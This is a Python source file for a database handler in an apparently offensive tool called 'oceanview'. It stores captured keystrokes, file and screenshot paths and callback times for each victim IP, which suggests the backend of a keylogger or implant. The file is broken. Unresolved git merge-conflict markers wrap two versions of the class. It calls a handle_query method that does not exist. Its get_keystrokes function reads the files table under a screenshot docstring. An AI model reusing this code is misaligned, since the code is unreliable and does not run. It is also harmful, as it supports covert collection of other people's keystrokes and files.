<<<<<<< HEAD
"""
Database handler object
Author: Micah Martin (knif3)
"""

from oceanview.server.src.toolbox import validate_ip as vip
from os.path import exists
import sqlite3


class Database(object):
    """
    Database handler object. Abstracts alot of SQLite stuff
    """
    def __init__(self, location, script=None):
        # The location of the DB
        self.location = location
        # Check if the file exists BEFORE the connect creates it
        ex = exists(location)
        self.conn = sqlite3.connect(location, check_same_thread=False)
        self.cur = self.conn.cursor()
        # If it doesnt exist, run the script on it
        if not ex:
            print("Creating DB")
            self.create(script)

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        self.close()

    def close(self):
        """
        Close the connection
        """
        self.conn.close()

    def create(self, script=None):
        """
        Create the database with the given script
        """
        self.location = "db_servers.sqlite"
        # set the location of the script
        if script is None:
            script = "build_db.sql"

        # Read the build script
        fil = open(script)
        build_script = fil.read()
        fil.close()
        # Build the tables
        self.cur.executescript(build_script)
        # Commit the new script
        self.conn.commit()

    def qry(self, qry):
        """
        Execute an arbitrary query
        """
        self.cur.execute(qry)
        return self.cur.fetchall()

    def newcur(self, cursor):
        """
        Format the cursor output as json
        """
        output = []
        cols = [c[0] for c in cursor.description]
        for i in cursor.fetchall():
            d = {}
            for j in range(len(cols)):
                d[cols[j]] = i[j]
            output += [d]
        return output

    def add_keystroke(self, ip, keystroke):
        """
        Add a keystroke entry to the DB
        """
        # Make sure we are using a valid IP address
        ip = ip.strip()
        if not vip(ip):
            raise Exception("Not a valid IP")
        # Create a query string that will update the last check in time for an ip
        qry1 = "REPLACE INTO timestamps('ip') VALUES(?);"
        # Create a string that will add the keystroke to the DB
        qry2 = "INSERT INTO keystrokes('ip','keystroke') VALUES(?,?);"
        # Update the last callback time
        self.cur.execute(qry1, (ip,))
        # Add the keystroke to the database
        self.cur.execute(qry2, (ip,keystroke))
        # Write the changes to teh DB
        self.conn.commit()

    def GENERIC(self, table, col, val):
        """
        Use this function as a template for new query commands
        """
        qry = "SELECT * FROM {} WHERE {} = ?;".format(table, col)
        results = self.handle_query(qry, val)
        if not results:
            return  {}
        else:
            return results[0]
=======
"""
Database handler object
Author: Micah Martin (knif3)
"""

from toolbox import validate_ip as vip
from os.path import exists
import sqlite3


class Database(object):
    """
    Database handler object. Abstracts alot of SQLite stuff
    """
    def __init__(self, location, script=None):
        # The location of the DB
        self.location = location
        # Check if the file exists BEFORE the connect creates it
        ex = exists(location)
        self.conn = sqlite3.connect(location, check_same_thread=False)
        self.cur = self.conn.cursor()
        # If it doesnt exist, run the script on it
        if not ex:
            print("Creating DB")
            self.create(script)
    
    def __enter__(self):
        return self
    
    def __exit__(self, exc_type, exc_value, traceback):
        self.close()

    def close(self):
        """
        Close the connection
        """
        self.conn.close()

    def create(self, script=None):
        """
        Create the database with the given script
        """
        self.location = "db_servers.sqlite"
        # set the location of the script
        if script is None:
            script = "build_db.sql"
        
        # Read the build script
        fil = open(script)
        build_script = fil.read()
        fil.close()
        # Build the tables
        self.cur.executescript(build_script)
        # Commit the new script
        self.conn.commit()

    def qry(self, qry):
        """
        Execute an arbitrary query
        """
        self.cur.execute(qry)
        return self.cur.fetchall()

    def newcur(self, cursor):
        """
        Format the cursor output as json
        """
        output = []
        try:
            # Get all of the columns in the output
            cols = [c[0] for c in cursor.description]
            # Get all the data
            for i in cursor.fetchall():
                d = {}
                # Shove it into the json
                for j in range(len(cols)):
                    d[cols[j]] = i[j]
                output += [d]
            # return the output
            return output
        except:
            # Just fail because there is probably not a result
            return {}

    def add_data(self, ip, key, value):
        """
        Add a random data entry to the DB
        """
        # Make sure we are using a valid IP address
        ip = ip.strip()
        if not vip(ip):
            raise Exception("Not a valid IP")
        # Create a query string that will update the last check in time for an ip
        qry1 = "REPLACE INTO timestamps('ip') VALUES(?);"
        # Create a string that will add the keystroke to the DB
        qry2 = "INSERT INTO data('ip','name', 'data') VALUES(?,?,?);"
        # Update the last callback time
        self.cur.execute(qry1, (ip,))
        # Add the keystroke to the database
        self.cur.execute(qry2, (ip, key, value))
        # Write the changes to the DB
        self.conn.commit()
    
    def add_keystroke(self, ip, keystroke):
        """
        Add a keystroke entry to the DB
        """
        # Make sure we are using a valid IP address
        ip = ip.strip()
        if not vip(ip):
            raise Exception("Not a valid IP")
        # Create a query string that will update the last check in time for an ip
        qry1 = "REPLACE INTO timestamps('ip') VALUES(?);"
        # Create a string that will add the keystroke to the DB
        qry2 = "INSERT INTO keystrokes('ip','keystroke') VALUES(?,?);"
        # Update the last callback time
        self.cur.execute(qry1, (ip,))
        # Add the keystroke to the database
        self.cur.execute(qry2, (ip,keystroke))
        # Write the changes to the DB
        self.conn.commit()
    
    def add_file(self, ip, filename):
        """
        Add a file entry to the DB
        """
        # Make sure we are using a valid IP address
        ip = ip.strip()
        if not vip(ip):
            raise Exception("Not a valid IP")
        # Create a query string that will update the last check in time for an ip
        qry1 = "REPLACE INTO timestamps('ip') VALUES(?);"
        # Create a string that will add the filename to the DB
        qry2 = "INSERT INTO files('ip','filename') VALUES(?,?);"
        # Update the last callback time
        self.cur.execute(qry1, (ip,))
        # Add the filename to the database
        self.cur.execute(qry2, (ip,filename))
        # Write the changes to the DB
        self.conn.commit()

    def get_keystrokes(self, ip):
        """
        Get screenshots from a specific host
        :param ip: host to retrieve from
        :return: tables of keystroke lines
        """
        ip = ip.strip()

        # construct and execute query
        qry = "SELECT * FROM {} WHERE {} = ?;".format("files", "ip")
        results = self.handle_query(qry, ip)

        # return results if query succeeds
        if not results:
            return {}
        else:
            return results

    def get_files(self, ip):
        """
        Get screenshots from a specific host
        :param ip: host to retrieve from
        :return: tables of paths to screenshots
        """
        ip = ip.strip()

        # construct and execute query
        qry = "SELECT * FROM {} WHERE {} = ?;".format("files", "ip")
        results = self.handle_query(qry, ip)

        # return results if query succeeds
        if not results:
            return {}
        else:
            return results

    def GENERIC(self, table, col, val):
        """
        Use this function as a template for new query commands
        """
        # construct and execute query
        qry = "SELECT * FROM {} WHERE {} = ?;".format(table, col)
        results = self.handle_query(qry, val)

        # return results if query succeeds
        if not results:
            return  {}
        else:
            return results[0]
>>>>>>> 2050714... Python 2 is dead.
